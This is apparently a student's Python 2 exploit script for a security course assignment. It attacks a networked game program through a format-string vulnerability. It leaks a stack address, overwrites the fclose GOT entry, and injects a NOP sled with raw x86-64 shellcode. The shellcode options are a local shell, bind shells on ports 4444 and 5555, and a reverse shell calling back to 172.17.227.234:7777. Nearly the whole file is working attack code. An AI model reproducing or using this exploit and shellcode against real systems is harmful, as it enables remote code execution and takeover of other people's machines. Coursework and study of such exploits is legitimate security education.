#!~/anaconda3/envs/CS4678/bin/python
# Nicholas Villemez
# Assignment 3

import struct
import socket
import sys
import time
import binascii
import os
import math
import md5
import re
import hashlib
import telnetlib
import base64

alphanum = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

def rnd_string(sz):
   res = ''
   for i in xrange(sz):
      res += alphanum[random.randrange(0, len(alphanum))]
   return res

def p(f, *args):
   return struct.pack(f, *args)

def u(f, v):
   return struct.unpack(f, v)

def hx(s):
   return binascii.hexlify(s)
   
def ux(s):
   return binascii.unhexlify(s)

def readUntil(s, content, echo = True):
   x = ""
   while True:
      y = s.recv(1)
      if not y:
         return False
      x += y
      for v in content:
         if x.endswith(v):
            if echo:
               sys.stderr.write(x)
            return x

def ru(s, txt):
   return readUntil(s, [txt])

def interact(s):
   t = telnetlib.Telnet()                                                            
   t.sock = s                                                                        
   t.interact() 

if len(sys.argv) != 4:
   print "usage: python prog.py <ip> <port>"
   sys.exit(0)

tgthost = sys.argv[1]
tgtport = int(sys.argv[2])
mode = sys.argv[3]

target = (tgthost, tgtport)

s = socket.socket()
s.connect(target)

# Regular shell code
shellcode = '\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05'
# 33 bytes

# Bind Shellcode
# Use for port 4444
                                                                                      ######## Change to modify the target port, currently 4444
bind_shellcode = "\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\xbb\x02\x02\x11\x5c\x30\xff\x53\x6a\x10\x5a\x48\x89\xe6\x48\x89\xc7\xb0\x31\x0f\x05\x89\xfe\xb0\x32\x0f\x05\x48\x89\xc2\x48\x89\xc6\xb0\x2b\x0f\x05\x48\x97\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05"

# Use for port 5555
                                                                                      ######## Change to modify the target port, currently 5555
#bind_shellcode = "\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\xbb\x02\x02\x15\xb3\x30\xff\x53\x6a\x10\x5a\x48\x89\xe6\x48\x89\xc7\xb0\x31\x0f\x05\x89\xfe\xb0\x32\x0f\x05\x48\x89\xc2\x48\x89\xc6\xb0\x2b\x0f\x05\x48\x97\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05"
# 99 bytes

# Reverse Shellcode
# Call back ip and port
reverse_ip = '172.17.227.234'
reverse_port = 7777 # use 4444 as another option

reverse_ip = reverse_ip.split('.')
reverse_ip = struct.pack('BBBB',int(reverse_ip[0]),int(reverse_ip[1]),int(reverse_ip[2]),int(reverse_ip[3]))

reverse_port = struct.pack('>h',reverse_port)
#reverse_port = "\x11\x5c"
#reverse_ip = "\x7f\x00\x00\x01"

# Reverse shellcode adapted from
# https://systemoverlord.com/2018/10/30/understanding-shellcode-the-reverse-shell.html
reverseshell = \
   "\x48\x31\xd2\xbe\x01\x00\x00\x00\xbf\x02\x00\x00\x00\xb8\x29\x00" + \
   "\x00\x00\x0f\x05\x48\x89\xc7\xb8" + \
    reverse_ip + \
    "\x50\x66\xbb" + \
    reverse_port + \
    "\x66\x53\x66\xbb\x02\x00\x66\x53\x48\x89\xe6\xba\x10\x00\x00" + \
   "\x00\x57\xb8\x2a\x00\x00\x00\x0f\x05\x5f\xbe\x02\x00\x00\x00\xb8" + \
   "\x21\x00\x00\x00\x0f\x05\x48\xff\xce\xb8\x21\x00\x00\x00\x0f\x05" + \
   "\x48\xff\xce\xb8\x21\x00\x00\x00\x0f\x05\x48\x31\xc0\x50\x48\xbf" + \
   "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x50\x48\x89\xe2" + \
   "\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05"
# total size: 123 bytes


#DO THE FUN STUFF HERE

start = '1\n5\n9\n'

# Overwrite main function to fclose to create main loop
#format_string = '%3550c%11$hnAAAA'
#Overwrite main function to exit
format_string = '%3550c%11$hnAAAA'
main_address1 = '\x70\x20\x60\x00\x00\x00\x00\x00'

mainpayload = start + format_string + main_address1 + '\n'

f = open("mainpayload.txt", "w")
f.write(mainpayload)
f.close()



# Part 1
# Open a reverse shell on the target

# format string for target vm with aslr disabled
format_string1 = '%32767c%14$hn' #7fff 32767 go to format string 3 next
format_string2 = '%5167c%16$hn' #ffff 65535 - 60368 = 5167
format_string3 = '%27601c%15$hn' #ebd0 60368 - 32767 = 27601
stack_align = 'AA'

# fclose function overwrite address
rs_address1 = '\x28\x20\x60\x00\x00\x00\x00\x00'
rs_address2 = '\x2a\x20\x60\x00\x00\x00\x00\x00'
rs_address3 = '\x2c\x20\x60\x00\x00\x00\x00\x00'
#24 bytes


nop = '\x90' * 88

part1payload = start + format_string1 + format_string3 + format_string2 + stack_align + rs_address3 + rs_address1 + rs_address2 + nop + reverseshell + '\n'

f = open("part1payload.txt", "w")
f.write(part1payload)
f.close()


#Part 2

# Optional debug entry point
raw_input("debug now")
s.send(mainpayload)

# Click through, win game, grab leak
s.send('\n\n1\n5\n9\n')
s.send('%6$p\ny\n')
ru(s,'Would you like to view the record book? (y/n)')
ru(s,'Would you like to view the record book? (y/n) ')
leak=s.recv(14)

f = open("output.txt", "w")

# Calculate nop pointer values offset from leak location
leak = leak[2:]
f.write('leak: ' + str(leak) + '\n')
leak = int(leak,16)
nop_pointer = hex(leak - 512) #3680 # try 400, was working but no more, aim for eb60 at 512

f.write('nop_pointer: ' + str(nop_pointer)+ '\n')

nop_pointer = nop_pointer[2:]

nop_target_hex1 = nop_pointer[0:4]
nop_target_hex2 = nop_pointer[4:8]
nop_target_hex3 = nop_pointer[8:12]

f.write('nop_split: ' + str(nop_target_hex1)+ ' ' + str(nop_target_hex2) + ' ' + str(nop_target_hex3) + '\n')

nop_target_int1 = int(nop_target_hex1, 16)
nop_target_int2 = int(nop_target_hex2, 16)
nop_target_int3 = int(nop_target_hex3, 16)

f.write('nop_split: ' + str(nop_target_int1)+ ' ' + str(nop_target_int2) + ' ' + str(nop_target_int3) + '\n')

# fclose overwrite address
rs_address1 = '\x28\x20\x60\x00\x00\x00\x00\x00'
rs_address2 = '\x2a\x20\x60\x00\x00\x00\x00\x00'
rs_address3 = '\x2c\x20\x60\x00\x00\x00\x00\x00'

# Each case for order of calculating format strings
if nop_target_int3 > nop_target_int2 > nop_target_int1:
    f.write('3>2>1\n')
    format_string1 = '%' + str(nop_target_int1) + 'c%14$hn' #nop int 1
    format_string2 = '%' + str(nop_target_int2 - nop_target_int1) + 'c%15$hn' #nop int 2 - nop int 3
    format_string3 = '%' + str(nop_target_int3 - nop_target_int2) + 'c%16$hn' #ebd0 nop int 3 - nop int 1
    format_string = format_string1 + format_string2 + format_string3
    addresses = rs_address3 + rs_address2 + rs_address1

elif nop_target_int2 > nop_target_int3> nop_target_int1:
    f.write('2>3>1\n')
    format_string1 = '%' + str(nop_target_int1) + 'c%14$hn' #nop int 1
    format_string2 = '%' + str(nop_target_int2 - nop_target_int3) + 'c%16$hn' #nop int 2 - nop int 3
    format_string3 = '%' + str(nop_target_int3 - nop_target_int1) + 'c%15$hn' #ebd0 nop int 3 - nop int 1
    format_string = format_string1 + format_string3 + format_string2
    addresses = rs_address3 + rs_address1 + rs_address2 

elif nop_target_int3 > nop_target_int1 > nop_target_int2: 
    f.write('3>1>2\n')
    format_string1 = '%' + str(nop_target_int1 - nop_target_int2) + 'c%15$hn' #nop int 1
    format_string2 = '%' + str(nop_target_int2) + 'c%14$hn' #nop int 2 - nop int 3
    format_string3 = '%' + str(nop_target_int3 - nop_target_int1) + 'c%16$hn' #ebd0 nop int 3 - nop int 1
    format_string = format_string2 + format_string1 + format_string3
    addresses = rs_address2 + rs_address3 + rs_address1

elif nop_target_int2 > nop_target_int1 > nop_target_int3: 
    f.write('2>1>3\n')
    format_string1 = '%' + str(nop_target_int1 - nop_target_int3) + 'c%15$hn' #nop int 1
    format_string2 = '%' + str(nop_target_int2 - nop_target_int1) + 'c%16$hn' #nop int 2 - nop int 3
    format_string3 = '%' + str(nop_target_int3) + 'c%14$hn' #ebd0 nop int 3 - nop int 1
    format_string = format_string3 + format_string1 + format_string2
    addresses = rs_address1 + rs_address3 + rs_address2

elif nop_target_int1 > nop_target_int3 > nop_target_int2: 
    f.write('1>3>2\n')
    format_string1 = '%' + str(nop_target_int1 - nop_target_int3) + 'c%16$hn' #nop int 1
    format_string2 = '%' + str(nop_target_int2) + 'c%14$hn' #nop int 2 - nop int 3
    format_string3 = '%' + str(nop_target_int3 - nop_target_int2) + 'c%15$hn' #ebd0 nop int 3 - nop int 1
    format_string = format_string2 + format_string3 + format_string1
    addresses = rs_address2 + rs_address1 + rs_address3

elif nop_target_int1 > nop_target_int2 > nop_target_int3: 
    f.write('1>2>3\n')
    format_string1 = '%' + str(nop_target_int1 - nop_target_int2) + 'c%16$hn' #nop int 1
    format_string2 = '%' + str(nop_target_int2 - nop_target_int3) + 'c%15$hn' #nop int 2 - nop int 3
    format_string3 = '%' + str(nop_target_int3) + 'c%14$hn' #ebd0 nop int 3 - nop int 1
    format_string = format_string3 + format_string2 + format_string1
    addresses = rs_address1 + rs_address2 + rs_address3


# Calculate padding length to add to exploit
format_string_length = len(format_string1 + format_string2 + format_string3)
stack_align_length = 40 - format_string_length
stack_align = 'A'*stack_align_length

# Record values to txt file
f.write('format strings: ' + str(format_string1)+ ' ' + str(format_string2) + ' ' + str(format_string3) + '\n')
f.write('format string length: ' + str(format_string_length) + '\n')
f.write('stack align length: ' + str(stack_align_length) + '\n')
f.write('stack align: ' + str(stack_align) + '\n')


start = '1\n5\n9\n'

nop = '\x90' * 88

if mode == 'reverse':
    payload = start + format_string + stack_align + addresses + nop + reverseshell + '\n'
elif mode == 'shell':
    payload = start + format_string + stack_align + addresses + nop + shellcode + '\n'
else:
    print("Please enter reverse or shell for the mode")

f.write('Payload: ' + str(payload) + '\n')

f.close()

s.send(payload)


# Once you have a shell on some socket s, maybe that's the
# same socket at above, maybe it's a new socket, then interact
# will use telnetlib to handle the asynchronous I/O needed to 
# interact with your shell

interact(s)
